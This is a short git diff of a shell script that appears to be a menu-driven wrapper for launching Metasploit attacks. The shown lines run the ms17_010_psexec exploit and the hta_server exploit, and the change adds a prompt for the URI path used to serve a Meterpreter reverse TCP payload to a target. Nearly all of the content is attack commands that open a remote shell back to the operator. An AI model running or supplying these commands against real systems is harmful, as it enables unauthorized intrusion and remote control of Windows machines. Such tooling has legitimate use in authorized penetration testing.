@@ -179,8 +179,9 @@ msfconsole -q -x " use exploit/windows/smb/ms17_010_psexec; set lhost $l ; set r
 elif [ "$x" == "$hta" ]; then                        #HTA
 echo 'Your IP:'
 read l
-
-msfconsole -q -x " use exploit/windows/misc/hta_server; set srvhost $l; set uripath /; set payload windows/meterpreter/reverse_tcp; set lhost $l ; exploit ;"
+echo 'Uripath: (/)'
+read u
+msfconsole -q -x " use exploit/windows/misc/hta_server; set srvhost $l; set uripath /$u; set payload windows/meterpreter/reverse_tcp; set lhost $l ; exploit ;"
 
 
 
